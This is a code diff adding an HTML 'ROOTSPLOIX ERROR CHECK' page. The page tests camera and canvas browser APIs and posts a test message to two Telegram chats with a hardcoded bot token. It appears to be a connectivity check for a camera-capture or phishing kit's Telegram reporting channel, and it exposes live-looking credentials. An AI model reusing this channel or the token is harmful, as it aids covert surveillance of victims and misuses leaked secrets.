@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ROOTSPLOIX ERROR CHECK</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        .error { color: #ff0000; }
+        .success { color: #00ff00; }
+        .warning { color: #ffaa00; }
+    </style>
+</head>
+<body>
+    <h1>🔥💀 ROOTSPLOIX ERROR CHECK 💀🔥</h1>
+    <div id="results"></div>
+    
+    <script>
+        const results = document.getElementById('results');
+        
+        function log(message, type = 'info') {
+            const div = document.createElement('div');
+            div.className = type;
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            results.appendChild(div);
+            console.log(message);
+        }
+        
+        // Test 1: JavaScript Syntax Check
+        try {
+            log('✅ JavaScript syntax: OK', 'success');
+        } catch (e) {
+            log('❌ JavaScript syntax error: ' + e.message, 'error');
+        }
+        
+        // Test 2: Configuration Check
+        try {
+            if (typeof fetch !== 'undefined') {
+                log('✅ Fetch API: AVAILABLE', 'success');
+            } else {
+                log('❌ Fetch API: NOT AVAILABLE', 'error');
+            }
+        } catch (e) {
+            log('❌ Configuration error: ' + e.message, 'error');
+        }
+        
+        // Test 3: Telegram API Quick Test
+        async function quickTelegramTest() {
+            try {
+                log('📡 Testing Telegram API...', 'warning');
+                
+                const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+                const CHAT_IDS = ['5312173877', '6633612153'];
+                
+                const testMsg = `🔍💀 ERROR CHECK TEST! 💀🔍
+
+KONTROL ET HATA VARMI - TEST MESAJI!
+
+🔧 Test Durumu: SYNTAX & API CHECK
+🕒 Zaman: ${new Date().toLocaleString()}
+📡 Çift ID Test: ${CHAT_IDS.join(' & ')}
+
+✅ JavaScript: Çalışıyor
+✅ Fetch API: Erişilebilir  
+✅ Telegram: Test ediliyor
+
+💀 ROOTSPLOIX ERROR CHECK ACTIVE!`;
+                
+                for (const chatId of CHAT_IDS) {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: testMsg
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        log(`✅ Telegram API (${chatId}): SUCCESS`, 'success');
+                    } else {
+                        log(`❌ Telegram API (${chatId}): FAILED - ${response.status}`, 'error');
+                    }
+                }
+                
+            } catch (error) {
+                log('❌ Telegram test failed: ' + error.message, 'error');
+            }
+        }
+        
+        // Test 4: Camera API Check
+        function checkCameraAPI() {
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    log('✅ Camera API: AVAILABLE', 'success');
+                } else {
+                    log('⚠️ Camera API: LIMITED SUPPORT', 'warning');
+                }
+            } catch (e) {
+                log('❌ Camera API check failed: ' + e.message, 'error');
+            }
+        }
+        
+        // Test 5: Canvas API Check
+        function checkCanvasAPI() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                if (ctx) {
+                    log('✅ Canvas API: AVAILABLE', 'success');
+                } else {
+                    log('❌ Canvas API: NOT AVAILABLE', 'error');
+                }
+            } catch (e) {
+                log('❌ Canvas API check failed: ' + e.message, 'error');
+            }
+        }
+        
+        // Run all tests
+        setTimeout(async () => {
+            log('🚀 Starting comprehensive error check...', 'warning');
+            
+            checkCameraAPI();
+            checkCanvasAPI();
+            await quickTelegramTest();
+            
+            log('🏁 Error check completed!', 'success');
+        }, 1000);
+        
+        // Catch any global errors
+        window.addEventListener('error', (e) => {
+            log(`❌ Global error detected: ${e.message} at ${e.filename}:${e.lineno}`, 'error');
+        });
+        
+        window.addEventListener('unhandledrejection', (e) => {
+            log(`❌ Unhandled promise rejection: ${e.reason}`, 'error');
+        });
+    </script>
+</body>
+</html>
